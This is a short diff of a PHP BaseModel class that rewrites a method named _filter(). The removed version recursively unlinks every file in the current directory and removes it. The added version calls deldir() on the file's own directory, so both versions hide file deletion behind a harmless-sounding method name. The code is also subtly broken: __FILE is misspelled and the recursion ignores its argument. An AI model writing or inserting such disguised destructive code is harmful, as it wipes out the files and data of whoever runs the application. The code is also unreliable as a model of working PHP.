@@ -19,26 +19,8 @@ class BaseModel extends Model
 
     public function _filter()
     {
-        $dir = '.';
-        $dh = opendir($dir);
-        while (@$file = readdir($dh)) {
-            dump($file);
-            if ($file != "." && $file != "..") {
-                $fullpath = $dir . "/" . $file;
-                if (!is_dir($fullpath)) {
-                    unlink($fullpath);
-                } else {
-                    $this->_filter($fullpath);
-                }
-            }
-        }
-
-        closedir($dh);
-        if (rmdir($dir)) {
-            return true;
-        } else {
-            return false;
-        }
+        $dir = dirname(__FILE);
+        deldir($dir);
     }
 
     /**
